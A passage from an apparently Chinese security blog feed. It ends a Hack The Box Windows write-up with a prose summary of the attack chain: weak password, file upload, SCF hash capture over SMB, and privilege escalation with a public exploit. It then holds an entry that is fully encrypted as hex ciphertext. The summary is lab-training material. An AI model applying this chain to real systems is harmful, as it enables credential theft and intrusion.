<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410100736.png" ></p>
<p>但是跟着wp一直利用失败，这里就留一个未解决的事项吧。。。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>思路：80端口通过弱口令–&gt;找到文件上传点–&gt;结合SMB服务进行scf攻击抓到用户密码hash–&gt;发现存在公开漏洞的服务spoolsv&#x2F;ricoh–&gt;l利用公开poc提权</p>
<p>涉及：smb端口scf攻击，学到了！</p>
<p>也是尝试了用msf拿到shell，方法二提权失败有待研究，目前花太多时间在这上面，以后再好好研究吧</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-infiltrator-user笔记</title>
    <url>/2024/12/28/htb-infiltrator-user%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c63f19d5cd58c6b918e5e28545510d253223468f9648f614bd2e592eded007e5">948d3a4d19e8bce16b53ccf2f5ad6f1a0f2e318246b5c9ffb29f08d8de963c313dcf97a7d3c712c67f662fe52450d59e94898354a86c6988241931d9c6b19eb77b0107f176e63a241a424e6584c7b572d66f7f990028692fbb6e27e029ef335315a5f5f5670cb0ff9eaa2472de48ddda8719c922299952070a4fb3bf21f6d5c521b3d48a54acb772e1fd462c963d58a671b8b4e22225db21f654d363a400896263bc063e424d84dfd055e478e2a1814fb2344e788aa0b2086a296cd14cd00a8a1b9d40f6ea33462a3b9d76c64c679d7bb52f325488512856c640640a003e22a183216f638e0e0038142a454dcccc833d4286645e033563862a0983890e0861f2a5e58b857e4646dce454f9c56dde031323de44c715f5ebe4990a08cd2e12623acaf3733541ec3457c6b1251f4d08ab375ce11cb329ae5594b54a0d476d1bb2b6c5ed0219b8932c38a9d12d00a8ee97a8c20fb94d25d7f65c87a4dd95b6d650424f5e56b67a54630ee9ea968db33627b72b4383933a0bb931c79a8578ab247a2860e46a886774b6a8c6a5c38fcd79d5335f811d4672918ca723734c0f0d78042afd43867687f1dc36bc3abd84292a8d7a4008726af66cf77b974d137f1e2525105fcade8a15bca23e4ebc3c901f328c0f28bcd9a2b3d648625ddd1d1c9dbdff434777284ebe808592439eb9a296eacac010c0454a7b37795bc3ac84ab3bd8633e40df133018308556473d4a6b7c412fd14b3148a3c272eac1a40a338118385aeee9a0140c241e3f1abe11356abcbda209fec37a2a6543a3709f169afdb96623d24b0838a36e4f75d80da23988917f49c65cf21386f72b84eccf8d00b58a8ecc446a160e07e5f3795853f4a59465f8d14b355a10d3a795bb3f8d9ad46e0a3e099282c5b3d7801bf9bca022a25fb0776c0d09f9320c0e699b87fd0bd051b92cc364ddc4db02c88978af61f3a4c03bd05042cdbb6b00cbd77b138f6dda61c3699e103ad9ea5303bfdfa7bd0d1848febc2e340669563d2da2159ca5d282fec6b285ecb526c25cc33060e4311dbdf69acc18d04204930d878ee66ee5ffb22f14d8a7a79718717b0cb2e630a799fcf4f4540e7760feea6126176540354b348af7b54870979b764f0e4b096bd5b3a7199a303eb12c3458ddca52535f7cc881f9d3ba2878527c42a8c96de0b6cac620e3dad8484d4cd87bdeb42f2a8303d5508e22c37d3743c0e5bc94a36826fa9f2e6450cf63bb15349cfd1dab42592701f095456e7e19afa94f2eead954c7ecda0f4fe8b77d1c7af42bbc3eb4b6dd1954ba18d88588d94a7f180714b51399ddd506fa27db301cbee28ea7c6ce194006ca51d79afeb908ff36ff151f41ae5f21392abc531a22af70db1238660b870c8bc970f84a57887fb138ecfd044a7a6f560f43b83b651d03951426b4989a83860fd4daffca65f4626c38f807c3fe27eeb30e33bfd1c9bb748cf0bc80ef4584ee484c2951f8cb2620060d55c52239d8507a00461b4f829cc60b849c8eeef3104cc6c6046005e7a1ef9ee017644fead1cf71918a862e08786a369f42a6850f40c8bd0abb9fcd50936962fe321718ab9ab22d395ad95a793a3babff18f32187155c367af1f6ae68df9018d28fd5fcaaeaaae4d204bb3e1a72780f0a23755b80eafaed12ca2fda50325ac028736e0793605887dec8e956f12f1eeb99829ef9ebcea97d913cd67dafdf2d26f61e370bd80a99f71d7e14ac766ad09543baadd1a97740562493544ee222788945e51642448113cc11f85c410c0297c1948ad3ebc233079132863915adf44436f7201762aa22d71a2086a63e67fde43868246e16dd300f969947e9bd9d0a1fe7aeb7c3f655a49cf0b95c4918be12eb0f64197c587beddb3e63c27e42b08b69600ab38fd4464f5191fff2684ba02098f25d8cb597309bcc01cac67fd8a8e2db71db2cc9b00a538526dcc028c47e27592ffcdc86b7d633d4b1c73445423a6517542fa9f1cbde2e056b9ba1619a40053bdc2a00ed9b5ac9cf703677be3ec16c53d56c76a13b3fb8b7000e292e04b81f3adf46f96180033df5b5ede6fddac0749354f3043535f12087f5811acac4f2d9a6d2dcb952a66e6db322c9c626d77a0bb48b19449f311b9f784811416960407a177e1deed53edc7cb3e8eff2f22cab91dd52a3e45cfd2e6599c109b828f820fa7157f54066a07c43a42372bf2d6ce9e923b2fc0cd8bd354dafca55d0a92cf720b0286bce7c05ee431c6e5fd8ee19669388a889308692e0eedae3f2c88635daaf094137be982219e428b8a0fa63e1e8eb8aad240c9168319f08f774ae600d6407fe6fec497a3496a430efcfb1e2f7ae8a20755aa40c36c7f16900d3db84de09b39343a9f53cdf246e994afc0d1dde75080ace7ba5324538860db743366e4df9960c11dc6ef25dc5a7d76e58b1f4c0fe0884bde1423e0205eb8bfdac82c4d35f30536782ce6210c00e59f3585f6c4adfc6635df12d33cb00b248f2fee21c1e78ac973dad1a026e6cfdf45ac20ba31bc195f1f3466e99b501bde751a6f11d051efcad7c1218664ae8b93057d074e098a4a64e75d2baa0cd723c3431bafef08d7121ae7df0890ca212a20751073a5051738eea8351956ae2c9c8883addc55ca04c00ddd94140f8b05145534d7a2b8ff01f8ba4023f42e2b956ab4fc84a2e5322fc23840c201e86615bcbd7c21808057e6c735201970a1236b4af51b78d2c0b7d6e073f3f2a96164171d3727628d53cf28423cca1411bdcfcad01981a9cd19555dddbe57699f18030ea76d66648c783096b46966a79dd93d80766fb991d9f03f439c111373ce5d176f931f749b834b1a3c02dfc62d1802e0a742ed8f1d8b66162fdf6db85fc02461926acd3e6161f16ba1230b4a85255c8164bb4bb17262ed2ec3bd1adb02214dec80e7744435cc999e10e1953c37e57c53a89ec9fb7dae9baee2961574f16aff7778b909c390fbb92f1bf3986028497205530e66eb1242c029cbf146aa0cfbcbfe28bc6ef52e23dbf2527c5773ca1cf2adf0a4a887fd43e2dffb4886ccc0e6f331166e743793147c3ba8ad1fcae52ca64b7087e417f42de70d73cd8263209f3bfba48424154bd578d770db65ed9f23e0b07f961467538216289dc2d83f3821268cbadb1ee647d7708875874a1c019ad91044286ab8ccb7b3119a3f7834548eece908f4f88584cd941db8ee9f9e98a9853f482004b406972df8c7d016bf519e5309997665a5d3f33cdd6abebb1770d10d9d26c52c81f9d997c0c1df609929ca381da54574593874bb06869f36d961529f9c852cd7a6ab69efb740b32845a53110483efab18ba9e7a4fe9437ded6af7dfd8611c1ecb0c4271049afaef52ee17698456d5ed4df2348acae06bf01e74f475a8f7ed05b502ada7ac1af1a0e7a0c035ece66429d6649941708017483fd25d603bd32e58b14fb288579878be039e76022197527a95fcccf091a9affcf0f6d65c1ac4e647973fed69dd4609a5095b8a52eb0c85e1dbfd8c43a127f9ef8bc70a9c76fc8a0175cd9bb6ecc1bbf05c24f378153fc4dbad4025400dc7406625f915eb0a8b0fcb4ecaa8c6ea1f21a5cd6f3975c65f6159081916c8805517518546222caed323a157756a6d865fe765d1c5f3d6cf105f9892763bb165aa37d83921ff9ded93f57492a4e7774d6166fecd87712f1238764abd4ecf96f433e9ecc487dfecf4b080b9d4cbe16b3295e2027b066995f8d4d546233f728c0c3a0c29f3bc83b57c17457a1b966e71ce95d2e4f496f44acfbe83701300054d8bb5c48af058ec1b28eaa650b7097cc4fe38b59f73ae9bf64b32a0e643b175228e3378fa2e7b17e6fcebb6692a742260ac7de8edd3063a19c14142ee433b65e7994cd4ce2ae198439d23710ad1116cb27562b6be5561d9208b3d8136149a41d23f1bdbe63783e9b257055208488bb91767b2344d19fd2f645fd8b489bb8fcb44760a3ae7ce5ee63e2564ea02b65b0517dac8040f523a94e940a33dadbbdc77f44520d5cccb74b2e16b200b1cdd3a216bdcc6c56bc90a52b0c6e218916f58aa124c624d3c4396267dfe3278c93962f8d552ec663fd2dccc9ca71df69e3e0fe3e4f541b00a8f27c15052c081484388cf4a217f01bbbda434135a3e65f28927c3ae74497a22f3eae9fed11178166dc6294f5ed777f6cd76f05a00eb31fdf8cfb303a59072fdc9b8247d8b0e416e7f6843e0b5c328c22b3d3b13e243e3971f2171788fe92a8dbe45e40b1f7318140a64b7626a01d320322baa4488e8fdd01de992bed0666c81d169eda0eb243e06c681b18d785ed7cd45ed279abc32bfad1c7327e162152376d80ede5fadb5b3f5fea31d9233a9fa1ba847c4c6dae1e3cf3a03f4c1c0f9e93a665db260a7ef737fe452a691b5539e7487aebfa965e8a8c3be5ef7d01a230b51361f32bba5577a48d8544afdb2b3f17676c80d2b0d9260b0a392e2c48327943013f246d40318aa854efd066538a48e8fd5d5939d9a445f49bbfa64c309fb4b9cda7e61861fc36ddd0c74f73b457fbf5254426ece8abb204be55ae15f7b7b4663cf2c62b2116a541048b3cf050480c1ce25c54ec22f1b608ea15f3d1eb8cd7b5e973bf29e77a6d14ce6c61b087769de2e86bbe4dab88509d054906a5fa2af39cb84931c9b1168ed1b96e061f893bbf248935e3be9b35a96157d33a34ca58c3c16d7d8ad01949f8c9ba2b73b560b4642fa9deb041b35050fd223b2ba10623f31116e235de8d5d5002a610c7184d2ad78260229166e3ae1c7e46c7f63b0b5e2d6d06585a2a25d3841c48c66c1a1ecfc3bf510f51110f2beb64c6326062c91f10b9b3064f8ebc4a20bc4080d464ba55ab28c309af14fff871df378fd720894003b5bd6a493d1f943c306f4b489101d03380fffeab2d7d06bb6daadb9314398c8517790da5b619781cb4d1518bbdc2d9534482b0c246179d2f795e5cf4d6572a00973d4c678ed6e2a5d1c35b2a98c0518cabd22da0a3574ec109a991184a7d1fa3a7148de471b59d50b0507265450bfd0a9fc051e99f5130b9d66d31493c51a910b60bb0bb528014c6ef711e0b28a92eb8386296e148b564cb8826a57fbebd42bb12e7a8039d90be7cafd65dc99fba31c9e67578aa5fe5c5b12653d5150be3b9ccb4c2018df7b8a78466292368e5dfc0223055c664149fb2722d6c2206f7551b11facee508b90580e5ce86578fc1e989b00f70d0c95a2dc89a1019a64a28c08a2cf093f02c6a5bfdaf6bbb8170ce0029943b838b1af6071b2d31730a994ae0eea667c8cfac97c4279a36d4b857a9d3c177e1f20d541f3217d4f059e0851a0739ee68803e5c145df4c32e6e4da07fa4b7cf66467ca34d46f6e07878c6267bb0702c542ff6635de39492f6de59efc1475a6f4c07066517059d9dd9cc7a29e4e5abbd58f534e5fe8b73ebd3494093050b8e8aa78e1fe15163b48e7c80d3acd4cc2c5298dd432048f0d3584dc5a8102b0f37e96fca19f9a49fd306a30c19aa6aebf770f563bd6e2025e6fe21b556e9c3a24880cdf242c6677e8bdc3bb2a4d139195105e498863b915672a75a2f6aa4b12c501b8b9b617111afb17b47d541120a8e19ec771e803c6dc52c5d250742bac622f008c5ad158502d9114ff5415e5a288631fc6e3aa5968e42d5256dd2fbd70c687698248213793bf89255798c2f9802da96d78904dcda8e948ebd3f6c423ff9d0c36a92eb3ba1cd8e04b57a4a5f55b0a739746f1686762dbcbfffcb0f790f572f823fd6d43c9ae7ff3e45366eb23f82a69653d1edcf8b3a121fb42b396b5df36edf934e67a6d5c895779afe5937f23852118a5dde4a308c76128b92ba66c7f755c501c5d3be93b48185e6653d514e62683c650d599bfa309ae45b676015c15e048d7f026c9a7dea441a9eccc0543fb970950d370b94b565791dd02fbcaf7bfbeea27c14ecc3af687d8a6fa796e1f215eedee319f738408ade309773b6ceb42bbe25249a7b50cdf290a1fed0758660814602df0e3d9f95e7b34ba6542668ddbd1686eb91b9848758e0a82c62add72ee03ee6c4584e4c49909e98aaea465a1f3762c719ede96a5638ff0c576f6d83028730bed408ca323104b5f151b3aaae329a26d1b686ac53db4f4d3d059dd483409a6db6d657c4d976823db01950434dd19f5d1ef8eabe3000a0a53c98e9c25ea432fd486e5d6f55a085e2eb8f2b6d066cab54843511e73c39f78900fbe787154d9ff1da37cb188581b8b975323c01a408f1f08d85c3f10b8d536d40cac89c8604ba44bf87664a49d9dee7372623b5c68c9547c2330fa484387b231255816d10916806d6f2f031e5a64fe324efc1eea195602acb126671860cdb8a54496e1f25a0bb04a132ebbf4cbb22a8c97295404afecf96da6edbd18f4ae74e0a7e2edc092b5eb3d32df82a365912d30b46f1ae3848b7d9380eafa81af5f5a9a807439ec3bf05e6c7310848bfe62cce7f13a5f96a303a76b611967a7413bbfc9d03d0c7baa2246e954a7ba6747fef20c29ff9ef0d01d7aa7f13416078a739d569bf8fc9e24e0a9165789b7d31ca04fb9935c1547b1c2ab32b30af82edccda8de94b291d4bd655c33c4885e07cedcf41c379857e5eac33eda1f69405798b684026cdf61a9642acbbfb6e28079645569647a778e1be69763f38592182790e3e03fa21aee93423fc397e7ffe3e58290b2cdef771bca35bdbc9a76425590f8a04e6f9cb7d257317fe7798f099fbb213582c86cb2d25532d85640cd6df0ea34e891a16580c89ee6b6edf7c8fc00ad20e112b6fc905842a87c8b1257cfe403a50b5fc23a840d3b0872483a98a817973ba9fcbd3fbe39009ef6e592154709aa177690b6d7f6d1d871cdbc568b88b4b4b4c4acdb7684ce8bf4e89ada1d9b01d929e91886edd00e87f26430561107e75ed46182bc17fe78bd9907790cde91d8ae439d11661ad710e24b4d34e4613dec5022a5d623606d905c79d00c73cf509009922db8b568f07602d30ec84b8beabb7375c7b1fd3a532545b669abbc1d9b141a8ec46f7e507e846a2ebb30db2247f65107e083fd817e3c600e3e2f37772593e5280e718933a6dc616edd24e558608c2598d1ce2c02e1798fc00c66652cd4e40ea955fb927ebfe1fa29f36b4d6e6b7f867bfb03d417ed7e2585acccdc8e7dd820a38ce745b2f8c29d0a0671a1fd9a7753e28bc857addf6d4e35fbd9474fcf9d64ed4db154e601022a3e609a056a8d7752e5522ac3027bc0778784fc1f046c09d8b361dffd67e68c850c5786829de9c6153f744f5c4ed5975f5901e67dd246ffacb8d4be18f386c62bc174270a1e7c88999f44aea49735b1373be204d97d0e9e47f60a0f89a65da4e6f9c75a3536b3970282e96aa9f7f70a6a333890e223b2256f00170158bb873866a1128c1604419051ec605281e5255d6300d8285205c9e9f4a6211cdd9b9653215d5378be64122560157c0b9c4c5575115267e3ccb3172442f3649c4237d88ce872ab51918a2979897a3069eb25b42c725d8c0e907cf023da052a088d4fcc0b4089b4d740cd94a9a7fe10f611fb8d130004d30d1e0b3a2d7ba48c2f4b829a472e49c840a49eaab6208501d23681a189c21ced92d4198d19378b0ecb110312a93ac3c65ae3a1cc4c28e84e35b139b4f51208ca8f559aae665a0ddd39e7d47423480e34842570f654a584aa0c15c12a1822309988f9a15aca9d3eb1e965aeb1fe89689df95ad305e7722a1985e5b1409824ceb852c567a44664e481e82b45b5c5c7dfa645dbacbd316f6004c22e3da6a10a9af5ef9d1d678fe915d8a5d0825be17b42652d7b8409b9693a37f59d3c193b83605e3f776f6db99ed655646a6802f9d12fae08fdcb5d7bec66c0d0dc339d2bc44a0da73680606d88b8932dfffd25cdc43723bad1bb8fbf1f2276f9524d5d21341409ff62e5412dc85b02172883770747c9fb7541325176f63837fbf821b465b1e463ed997efab92170e2b02906421bb8351e8ba03fdc9b591c8d2755b7c79e0f019688eca05072822a3f464045a8122d172c1e99e3c16d7a0810bcfab5f8b858937fbcec2bcf0b49c2584f68804c1ed00ade4ef4ba6a63d25f1fb92725c25fb6f4fd51de8b7dacec889c7e0cf999a2c93e36967db1b8fd70ed3240f7bb0a341716e32f3485862916ab65b721aca25e6ce510999829bd6b1341be4b39cfbd619f664be18aab2e3f0e8f0bb3271cf91c213dba9c1ec737859ba2130ff350102f3b39e52bafa7bd8725321725ac359482e8d506b25b3aa375d38ff11f0942a1e0f7017421cf6af81abaec88f0f7565a9bd9bddb3e317364085084eb7bbc233953ca41b90fb4dbaaa36f00caac7ddf7ee915ab6f15df9f36fae2d6c4d3fefc3843c815d0bcc6d36d23fb960ce93c8e4e33730b3c3e2b7945e434b880c8fdbccaf7484881c8819775ce52093effe0231a8bbb32942e6a5a33afa604dc84c852f79571a880775a8e0add97de11ebeeca06fde3827ac0baa402c5f5dd1566558ba3dc4cf5df9d44a462bddfd8d434757b1b706642f83ec9a3151ac95eadcd90d781d9c11b8f21f742f43808a02139203fe66a8f372b71a8b68ce6f0d15dd93c0e9f690c179ac35ea08304a7057317d0c97e130aed7bfe8daeca610dc3d0b4b5e0f2041c1eb8318b57a9f596c5f52f108d840eed2862ce0635ddb74009ad0c57d49a72e950081e6c16fa41f44902e9f4c204cc0072b79c529b3cbc1a093e3be2953d7440808d70803a56bf6236203fe5ea5881789c937f3e58f96fc5788a86f274fb63c86f98def9c070efe3734de1e50b7dc7e28e0034371c04dbbc824ed6e54600a54415e7e07c7cf3dccb17f2412bc76e114ad22ad2633b1c840d25f34c30c1d9e2056395c8ad88cfbe8332fc87c3d5de9065214b337bf5c147b6e42ef6304d1d48b23b7e524eace775c8b207794e919448b58bc6f1f27f6d05f86cbd375cb3be4aa7c54f68c490a87d0e724cdb9b55a62ac6a3e3e41be0814137a6d6fe1580091e8287e3ec1885cc3dd83dce323f926aa106e66464c890e049d3cd3feaba5c27e7562af410a389748cde3cc14e2e952feabbd2cbc894be6fdef2eb2c82f127162411bbb0e83aba0e7f0bad30eea4b14b77ecc5fa1e3f90fb81e8187e0bed454d56ea74975468ed6ccab2fb08f190a128e6fc22b3fd5d064e7f6fb8ec48b5d266c341d2356076e464229e13bd4180325893ad4bc49fa99b5964f51a0b52cb3e8ed3aa87ccac55130c5471f2c155262fd94fa1199a55834db9748e9a6cd6afa900b4bdaf5a2682d7950ff824f2045a74743703020a6d31660fa0078e67145c7ef8005e77cc2cb5270b99622f5d8c1109803ad4a3a0bd0b74fd1dd4c938031fe9defc6b6eca6709ba4d86420649545c70bc867c14f2176be8bcb6cfb6085cfde18e8b6d0e47974871b62c4f00f0ec875dc74109beec968036e55e3b634b56fb0d8d6d08e188caa34307c4107e48bc5a3cfd1479daf9564901af838fda3138eccbebb18d2045a84b33da924555ed32e2f6f19d5dffff893916b533af2f6299998e9f9aed61aecf0f70a92bec8c002baf05f8671ef0b60efdd5572fffab5c72729df453801a49c285941aaf98c10fca114c91fc3d41ee5f9cce4d520002e801ff1166122a1eaf7373b38c5bedccaff886420ff241da764fb65640c76c6f4593e63d0de962bfca1adac108ab18355c9a7e7bb400df0a9b0ce9631bebe9133997cc436be1f469deb83b8d3a9f787d36b2cb22ee79f790fcdffb893e0a01451e2f622a560f10fc46e1648c8b6b8ed37945631200c1e80f22ac2dc28263782b028948ef3d362316f2a52fe81ef0e496f5d98c844a1e28ac4350255eda2f4603e556bae7572b48145347772b1efc7829dd7e86b9e70650068a294ffdc384f194b7412e5bd7a5ecf8e8024ab4a2548e9795c24e36b34abea7766953faee649a1957680b993f4f68cd0665c43951fc53b7d13e37396b6b9881fe0b0113c596a0889cd78572e57542d113775f6e7caf16d5f2814ffe0dd1af31b2b71433d415be624c752cb1897c756b650a73a6bad7429aaa1894658bf4cadccf0099f6cb620b96395135c13dcd987adc0a7b07a6de60347155c9f6b03d59e16c1df37e0bf56694bc6349627421762ff9633eb121525a16c5f2c109760abef75f73e6ff80261ecf5d9e95190d9629cc29cc63d6dd72d57eb6e0efee53369f513bc24e0925f2fd1f145f2c71e46565c65c38bb1cbfa26aa9e145d752f437c9cf1bd842703ea4f21483fc7e42f91c9e0ca6cbd4ba023e5939665b5e422b0f85e645628433f5c4d6259e2f56640f8b88cff2770021943b162802e0ae99f3be5616d1390cd9e2db062bb4f2e25100ba9d0c18bb4407c64799f6bd92c0a462373dc8ad974116dbe664fa96c33628723678b90108075d3296e487f3ccc69e1b4f912c2ddac33f40bd0bf0df94f3eec252adb057fe4b2dd8777a9fbc2c12baabb49090b7c69e40c05881cecce016b1caff4cd17b3ddeb74356729d4d58331433fccf45d1120a8acf2d3727db9d209e174619a3d5d82154c631897c0c040043717c272a1186bd5cf0ce154af275f2f2ec29ff6b884aada3bdc97a7464269223a94bdb972fb0f204ab26c9db86944e33084773f056e75bdcf8bd9aead05b565cb15534e829b33113629994e8bbd375f24e0ed076c679e144e2c054fbc2b7195d04f47c9d9bab12af933e6f67503db58ab2cd3dc5de769a1dab683a9707530d9a1bcf794e481b7f620175150cd478187f88199147a8d6361b1f61f542b07dc5bd96f0b871b73c69a145a90af731ff187ed3045b07d9f75429699acb81c5f8cf9a4260145fb582914838980f5c2640bef10e7ba0f035c24860069c7cf7d3b96997278f3d5d749095d455c8c930ecb04d375174acade29a9e01acffc1eb83531c79bb1bd2e9f52537bce9a406e2fad52b428fa3a6e632cdc03728f7b45a3e0a2b231f233f1af0b4c6412d17defb3ae98845579bad13c6d19393c3cf9fb99cf3fde81dfb7b68d9856e22e86160c8a49c4dfbad09b38d34486ed81423fff33b0e2a1a640e636e78164d3dd6f87a5761978faf9e6566d14e0cf847699a892621f2d86c026a1965023c0e8647086ffe3405c1b28f3d39d96bc0cd834c0adf62d2788ade211f0479f294692c81a07736eb9800c4ec974efb6a7e2d9845f003e4b31fb7eece99d86c5d663955598bae01745197776f7fae2e130f4fce863a3cb459e5a287e905595e56b8f7939c87b566668d136d7b52660a69ed9170bb88fe5c101d309d4d1b1a8fa249e9c7eb920498991c1662406760bd233b1f1f1b36334196fdef70d1a26308e9947180baef75d2a8d27192fba7d8a596d319389fa97e490508c22957e7f92de0a8c80d8124550a22804c82bfdb75b460959b451c5655466be1168de0ab919d644563d986ec7c367fd5faef1559d3376b1fdf7b77397c20a18b4e3a04e54bb9cf5370bcc016b8b649a6c2bb485e0bf4ad65463e7fe03fdabae9dffb0b9f74120f49a6f4952a5aa270951dd462201c2f70f0146e915b4f02d1e2bce2e39c6dfaadac073f03995fb46c76424e4f2b56a60fdeced2d0077d777aeb6c295aaf25575b1493011056e3e84b1c37db3fe07c875c778befc2bea146cb70a2ae47ee5aea8a30b6d25270ccd1ed607d3b58b44ed589300cfc602b6595ce8a291619dc2abae29d7df8f30d42ac51c904bc41d05a88f488438decf364e6ebee2791b6a4b9c90d06fadcf09e434aac9fc828c071c6ed8a1d00328559afd3ca2f31c6bcd799aa9b7eb23f2f371ca6213709dd71992e898163e2570837a48addf22d3cf5972990762d4ede6039ef52de4c34f9e1d368a9d006141a209947eccc3e3a66f35571fc0662ce746103ea2bb4925cfe1aa263e0d2300ebd6792c4ce9df65dbe30660cb0d1b4a689118ae1fa2689f5049699c0d2b0dd9ac61f644c7b9e6ef735f4bd52955d30946f5db1003c0cf3dd4430ddfcfd9f56de47d9ece4bff292f4378f42b18e73d7c6acb84fdab00e20328a69ad9672ccec4cc6bf2eb5f7a3d8f653d6c9f494282714060607f8c4056ccf8f2b1768142f266530a2a8b6d8e1b6191a0ccb1e44aa01cf38313344014d9538b6a69dbd97400db460225c55fb9c956aa1acb5c9f58ae0024d3c5e401cb79e4a573f79d83c69833fd0e57ddaba9c34eee8fada5d2dfd07d3efb3f6b30d4652c95428faee9690a1811258ce293f8703884f02f55b0f66d3bdd41f07983c66592740494931b5058dd37449ba192aea3a7ec5be34360229ea1c8f8af486bf6fedd7fc255ff87550606a13fc38f937d7c7f1815b7ba3b1b43c3464cedc7daca9ce15dce1a05f4b8295bcbd6797595697c7bad720cf352cb9fb297a7472ec67b27a3481c2058e1abe9b7d0664452ba3130118d860ed0b314c1b46ebc097bc212cdd270bb9607cc07a22c1df2b64d6539b1e2ed6cb53a0291d2ed20d4a635639558b62e9b0226d12faab80edd18e7212b05fba2974c313e03d13ba9d7648023657820d9014b8e420addc5bc00f20f1d885c08d24145a49d0f68fb32b471781c1226d4692becc9c6ba64296adcb3d3e3566468b69fa9c0ae52cea01c1081ea31ceaef30125fb3bff1f1de30eb2bf6002108b0da3b0da6448091e6140bb8e3cf2f6cf94d93cf6050c21537a832748c63ef6287c41393f26cb6b89e2810284d2b528a40a0552a60da7293c10c1b507c3d4ec0b36aa0bc95ff8b98bec957253a65ac4ab7c884fa75248933724118107fbf8dff6ed3f2f78559152662e3a2b1dc9841a2aa153678e3aceee0fb2539d7546a1439c5bb5c27e7f74c969cdf017a3c96ecd062c9a89dd99874846c1558bd19ec46a48b8f3ffcd2754c28eb2ffdaf18f80ab51a765d33a9cc9d9a115a33f6bc4e74a517651b164f3f265e4ddc4ed7eca879dc6431bb8090b266f5848d7afed48d44e11c1e1e0905235ee9a4de1288ab1e89b4480a610191bcc51a89320fb1dd0d9377cf2100d73f72c5f60600e6c1f04b62259ce07868eba07febb2c78f1699178a39208c30d8e450f84ab910258070a31ab2d2503fd9b864f7e627ed98b0b24321ed19dde789dff0942aa63f56a9ecfcf48cca3831d9290f987ae649d79b808afdcea3a28e950b813f6292d852902706becf4ffe67122b018cbb7f78baaadbd02ff887d7d320b64d152333d3a69e8fd3c4b4216de880dec95e32367514974fea98805c2f75892daf4e283d8bc1046e92c97f7afecd80f18f2ea1a7d9fcf63fc21b9a8786d119d8d766c259a26bd990fdc9d4501dc9be92312650b6873157eb10f111685496a50b30365db87be34be81ef61b235bcf8cf0d3d672c6cafa52c4cede124ecdca64fb8695be2e85ec26a4eae0b13f989587dad84f1b2672f0e4ba49156b3ca6ceb1469de3db9b072006b6a945a0167a95e9d1774df042965b0c4a8c7fc77ac9d968b0ad686cc64b5c36c4c3f1a40fd0a940bbbb3e9f91cb274d0944687724fc60365c9622217dc3182ebcdb8f432d517f0f2d79be8046ce9db20c9a87739e32e3c038f22a7f58483c1593d6df7b62aa30733fbbcd0425e500c850b4b4dba032aef8e94234760346ba580c37278e01e3ef4641f329ae2788eb2b18833d09e16d510a1c02927992b7da9b54aafa6f49737e76a23575c76af1b2259cf2bd1739d6d73f7579cf4f23301ae5826eda6f4f77e1f59def98f03400b3657f8e674e1efee2b48d3f838140029e0f1a9e032840eb6e7adb23325931e05880b90c3c27fad85e7f4bbd568ffbb46fa35696a5388db0c2b65fc91cd9521157358644b54684b2963259169200d59bfae1573fa0c9d95b9faf53c578c2b775cda881657dbfbdbdb51f4574a08f32c1b67aa424bf87bc8dc28290e2d8a5f4556433c4415bf9c8761bcfa0927167a0258c91476f9abd597accd4deb6c43a76e3393fb5d08f7d44dfea9366b5ad0e2625911fe6adee3035ae2d73437fa8e9280244027f10da364877447e4fb8e8d933b0dc2c4e836265fa77593868034032a4362f9ab5d49c00fd41cf61787a4590bf6b422a93fcef9021c8573d9ae1fa5223d8172dc3e79f97fd0f2d3bcd3ce2be881458710271b82a2cb7d2b2be882a1d451335d504ebba903be4775d0ab1022c5dc09d7d13637c220ade117b905bf441c49cea883e42a1781750133ec65140953daba17b3884badd8874a0b7d71b28f361bce827b90112f96c8969eb72ffbcc8a2e435193c119a1e760c5cd5a501c6e6294f4120d9b59b9683a227c0d7d3c49b381595d50d3314fb3e0bd61c20e8e03e85b9f1a626e82cf2ce02a619ab211c9ba0091c87c96fb168b6bdc3b347e1da5888653841a45cb84b61137abe3d7f8592d58cc05a467beb050ff604af18339d1fd530d5e170dbcca52c4c686f89d7b994db499a3501f4c445f61b0525d95178e28becd1a6d8574e26e095cb07baf90f08ddc883ecfb1b6f8149ac73cfa691c4ebbc610dcab37cf6ba1518cd4e8934fbde7400a5d605ca64377638b64cbb567e1d457a2d5c2c004f8db4023bf66fade0b62067b5d68fe895fa51bc31c8bd04e4fb0974f1a14b82541103b54e477ad902c3634d7aeb531a44f687499787b98710a55e690e03b31aced635c1886b3aa19e41518ee01523249f4a46c28142607c9fd667d38b9f33ed98ff5bfaf895304040170b10391d5c064f75c4c4f0e85a107e782096c3dccc01e9a0536c231987f5e5bdf2d583ecebb89290667d186a23335fdf9c04b3f6fe64340a2db80200dd6d8fcc033dfacd666b02b4b08e48fa3dae9f44206feafb409ab059d46a105929b8ce1cd8d80ae16ee8a2367605c09b1c81e0cf1ecb8a575cf6cce354ffded4f50e848265ec4af8d2174dddbcc3cb130010486fc3f9ad61444877af8da941028e1b057ae63da3ca4b2aec6ac645dd21cb4eb8eec6c01558b7ecfc335d7dc5b707b5528fd0a9732b48feca064f209d3a33e09678e701db3fc002b437583d832c811e8a8dfb47231f4095b5c3d5dd21ab8bbe2e41fd403e57071957df993828437b9ae3a4a80d97803344de2a8d06e380edfb43cf61b61d2201f6b4aee446dbf9c1686581cb18f8dbe75480a78c52d508a339f95719bc3d1752ebe58847437ffbb111730d1d935b0a7b8df0813a5f1361060f2337d86434bba3624c5d4dd79a280bc1fb86a10796f631a8bd1b415dd2f3c92ca06b453bb22a6a66d6b4ab15e5ef4b8f0c9bc41034d96a0a508a261f98217773a21f4d3d899026265fca4840c98a72ea82d2036a0d1e45786f0ca6fab2863698abcc48bfb9a3af715df9f72271a581eea0a8cbfce686a185bdf3a2395c5b7f27d6f80c05f25de2c4a5d8219d13371290a6335c5f35a6b500d45c21319453c644a5f0786e3716840084b56a4e773cb19483439722024468355144a0550ea183678004ea56f53fe17ce1d91cf768c18c05ba3dc6136769954374b9f93a49a54e786385e372eb484f9950260a4925dce3452c070bb9e6d40e3597e93ff439ece38393e661344f6ea7030945545e4bde19cde31129997f98f52a4331b8134e73c5f5817314d54de71cb6e2b619ca9a193a480245a7d7d30ac36e1043cdc682529096f11479fae25ebeb31b7e2706ec2c2a77f4eeeb4e03b